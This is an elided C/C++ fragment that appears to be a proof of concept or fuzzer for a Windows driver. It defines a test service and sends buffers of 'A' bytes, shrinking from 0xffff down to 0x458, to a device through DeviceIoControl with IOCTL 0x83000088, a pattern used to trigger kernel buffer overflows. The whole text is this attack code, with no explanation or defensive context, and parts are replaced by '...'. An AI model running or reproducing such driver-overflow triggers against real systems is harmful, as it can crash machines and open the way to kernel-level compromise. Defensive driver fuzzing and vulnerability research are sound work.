...
TCHAR szServiceName[] = _T("ServiceTest3");   
BOOL bInstall;   
...
void x83000088( )
{
	...
	for (int iCount = 0xffff; 0x458 < iCount; iCount--)
	{
		char*szBuf = new char[iCount ];
		memset(szBuf, 0x41, iCount );
		DeviceIoControl(m_handle, 0x83000088, (LPVOID)szBuf,  iCount, (LPVOID)szBuf, iCount, &nbBytes, NULL);
		delete[] szBuf;
	}
